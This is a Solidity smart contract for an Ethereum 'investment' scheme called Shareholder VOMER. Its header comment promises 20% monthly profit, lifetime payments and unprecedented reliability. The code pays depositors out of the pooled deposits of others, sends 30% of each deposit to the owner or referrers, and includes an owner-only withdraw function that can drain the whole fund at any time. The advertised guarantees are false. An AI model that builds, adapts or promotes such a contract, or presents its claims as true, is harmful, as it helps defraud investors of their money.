1 pragma solidity ^0.5.10;
2 
3 /**
4 Get 20% profit every month with a contract Shareholder VOMER!
5 *
6 * - OBTAINING 20% PER 1 MONTH. (percentages are charged in equal parts every 1 sec)
7 * 0.6666% per 1 day
8 * 0.0275% per 1 hour
9 * 0.00045% per 1 minute
10 * 0.0000076% per 1 sec
11 * - lifetime payments
12 * - unprecedentedly reliable
13 * - bring luck
14 * - first minimum contribution from 2 eth, all next from 0.01 eth
15 * - Currency and Payment - ETH
16 * - Contribution allocation schemes:
17 * - 100% of payments - 5% percent for support and 25% percent referral system.
18 * 
19 * VOMER.net
20 *
21 * RECOMMENDED GAS LIMIT: 200,000
22 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
23 * DO NOT TRANSFER DIRECTLY FROM AN EXCHANGE (only use your ETH wallet, from which you have a private key)
24 * You can check payments on the website etherscan.io, in the “Internal Txns” tab of your wallet.
25 *
26 * Referral system 25%.
27 * Payments to developers 5%
28 
29 * Restart of the contract is also absent. If there is no money in the Fund, payments are stopped and resumed after the Fund is filled. Thus, the contract will work forever!
30 *
31 * How to use:
32 * 1. Send from your ETH wallet to the address of the smart contract
33 * Any amount from 2.00 ETH.
34 * 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.
35 * Take profit by sending 0 eth to contract (profit is calculated every second).
36 *
37 **/
38 
39 contract ERC20Token
40 {
41     mapping (address => uint256) public balanceOf;
42     function transfer(address _to, uint256 _value) public;
43 }
44 
45 library SafeMath {
46     /**
47      * @dev Returns the addition of two unsigned integers, reverting on
48      * overflow.
49      *
50      * Counterpart to Solidity's `+` operator.
51      *
52      * Requirements:
53      * - Addition cannot overflow.
54      */
55     function add(uint256 a, uint256 b) internal pure returns (uint256) {
56         uint256 c = a + b;
57         require(c >= a, "SafeMath: addition overflow");
58 
59         return c;
60     }
61 
62     /**
63      * @dev Returns the subtraction of two unsigned integers, reverting on
64      * overflow (when the result is negative).
65      *
66      * Counterpart to Solidity's `-` operator.
67      *
68      * Requirements:
69      * - Subtraction cannot overflow.
70      */
71     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
72         require(b <= a, "SafeMath: subtraction overflow");
73         uint256 c = a - b;
74 
75         return c;
76     }
77 
78     /**
79      * @dev Returns the multiplication of two unsigned integers, reverting on
80      * overflow.
81      *
82      * Counterpart to Solidity's `*` operator.
83      *
84      * Requirements:
85      * - Multiplication cannot overflow.
86      */
87     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
88         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
89         // benefit is lost if 'b' is also tested.
90         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
91         if (a == 0) {
92             return 0;
93         }
94 
95         uint256 c = a * b;
96         require(c / a == b, "SafeMath: multiplication overflow");
97 
98         return c;
99     }
100 
101     /**
102      * @dev Returns the integer division of two unsigned integers. Reverts on
103      * division by zero. The result is rounded towards zero.
104      *
105      * Counterpart to Solidity's `/` operator. Note: this function uses a
106      * `revert` opcode (which leaves remaining gas untouched) while Solidity
107      * uses an invalid opcode to revert (consuming all remaining gas).
108      *
109      * Requirements:
110      * - The divisor cannot be zero.
111      */
112     function div(uint256 a, uint256 b) internal pure returns (uint256) {
113         // Solidity only automatically asserts when dividing by 0
114         require(b > 0, "SafeMath: division by zero");
115         uint256 c = a / b;
116         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
117 
118         return c;
119     }
120 
121     /**
122      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
123      * Reverts when dividing by zero.
124      *
125      * Counterpart to Solidity's `%` operator. This function uses a `revert`
126      * opcode (which leaves remaining gas untouched) while Solidity uses an
127      * invalid opcode to revert (consuming all remaining gas).
128      *
129      * Requirements:
130      * - The divisor cannot be zero.
131      */
132     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
133         require(b != 0, "SafeMath: modulo by zero");
134         return a % b;
135     }
136 }
137 
138 contract ShareholderVomer
139 {
140     using SafeMath for uint256;
141     
142     address payable public owner = 0xf18ddD2Ed8d7dAe0Fc711b100Ea3b5ea0BFD0183;
143     
144     uint256 minBalance = 1000;
145     ERC20Token VMR_Token = ERC20Token(0x063b98a414EAA1D4a5D4fC235a22db1427199024);
146     
147     struct InvestorData {
148         uint256 funds;
149         uint256 lastDatetime;
150         uint256 totalProfit;
151     }
152     mapping (address => InvestorData) investors;
153     
154     modifier onlyOwner()
155     {
156         assert(msg.sender == owner);
157         _;
158     }
159     
160     function withdraw(uint256 amount)  public onlyOwner {
161         owner.transfer(amount);
162     }
163     
164     function changeOwner(address payable newOwner) public onlyOwner {
165         owner = newOwner;
166     }
167     
168     function changeMinBalance(uint256 newMinBalance) public onlyOwner {
169         minBalance = newMinBalance;
170     }
171     
172     function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {
173         assembly {
174           addr := mload(add(bys,20))
175         } 
176     }
177     // function for transfer any token from contract
178     function transferTokens (address token, address target, uint256 amount) onlyOwner public
179     {
180         ERC20Token(token).transfer(target, amount);
181     }
182     
183     function getInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, uint256 totalProfit, uint256 contractBalance)
184     {
185         InvestorData memory data = investors[investor];
186         totalFunds = data.funds;
187         if (data.funds > 0) pendingReward = data.funds.mul(20).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
188         totalProfit = data.totalProfit;
189         contractBalance = address(this).balance;
190     }
191     
192     function() payable external
193     {
194         assert(msg.sender == tx.origin); // prevent bots to interact with contract
195         
196         if (msg.sender == owner) return;
197         
198         assert(VMR_Token.balanceOf(msg.sender) >= minBalance * 10**18);
199         
200         
201         InvestorData storage data = investors[msg.sender];
202         
203         if (msg.value > 0)
204         {
205             // first investment at least 2 ether, all next at least 0.01 ether
206             assert(msg.value >= 2 ether || (data.funds != 0 && msg.value >= 0.01 ether));
207             if (msg.data.length == 20) {
208                 address payable ref = bytesToAddress(msg.data);
209                 assert(ref != msg.sender);
210                 ref.transfer(msg.value.mul(25).div(100));   // 25%
211                 owner.transfer(msg.value.mul(5).div(100));  // 5%
212             } else if (msg.data.length == 0) {
213                 owner.transfer(msg.value.mul(30).div(100));
214             } else {
215                 assert(false); // invalid memo
216             }
217         }
218         
219         
220         if (data.funds != 0) {
221             // 20% per 30 days
222             uint256 reward = data.funds.mul(20).div(100).mul(block.timestamp - data.lastDatetime).div(30 days);
223             data.totalProfit = data.totalProfit.add(reward);
224             
225             address(msg.sender).transfer(reward);
226         }
227 
228         data.lastDatetime = block.timestamp;
229         data.funds = data.funds.add(msg.value.mul(70).div(100));
230         
231     }
232 }